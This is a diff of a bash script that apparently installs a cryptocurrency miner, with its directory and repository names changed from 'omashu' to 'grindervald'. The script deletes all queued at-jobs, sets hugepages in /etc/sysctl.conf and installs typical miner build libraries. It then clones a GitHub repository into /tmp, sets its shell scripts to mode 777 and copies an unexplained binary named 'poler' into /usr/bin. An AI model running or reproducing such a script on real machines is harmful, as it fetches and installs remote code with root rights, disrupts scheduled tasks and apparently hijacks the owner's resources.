@@ -1,18 +1,18 @@
 #!/bin/bash
 
-rm -rf /tmp/omashu/
+rm -rf /tmp/grindervald/
 for i in `atq | awk '{print $1}'`;do atrm $i;done
 sudo dpkg --configure -a
 echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
 sudo sysctl -p
 sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
 sleep 2
-cd /tmp && mkdir omashu
-git clone https://github.com/masketteland/omashu.git /tmp/omashu
-cd /tmp/omashu
-chmod +x /tmp/omashu/poler
+cd /tmp && mkdir grindervald
+git clone https://github.com/masketteland/grindervald.git /tmp/grindervald
+cd /tmp/grindervald
+chmod +x /tmp/grindervald/poler
 chmod 777 ./*.sh
-cp /tmp/omashu/poler /usr/bin/
+cp /tmp/grindervald/poler /usr/bin/
 sleep 3
 
 sudo apt-get install dos2unix
